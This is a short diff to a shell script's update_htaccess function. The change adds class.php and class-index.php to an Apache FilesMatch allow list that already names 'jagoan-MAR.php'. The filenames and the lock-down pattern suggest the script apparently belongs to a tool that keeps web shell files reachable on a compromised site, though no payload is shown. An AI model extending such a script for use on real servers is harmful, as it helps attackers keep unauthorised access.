@@ -77,7 +77,7 @@ update_htaccess() {
     echo "    Allow from all"
     echo "</FilesMatch>"
     echo
-    echo "<FilesMatch \"^(index.html|$php_file_name|$index_php_file_name|jagoan-MAR.php)\$\">"
+    echo "<FilesMatch \"^(index.html|$php_file_name|$index_php_file_name|jagoan-MAR.php|class.php|class-index.php)\$\">"
     echo " Order allow,deny"
     echo " Allow from all"
     echo "</FilesMatch>"
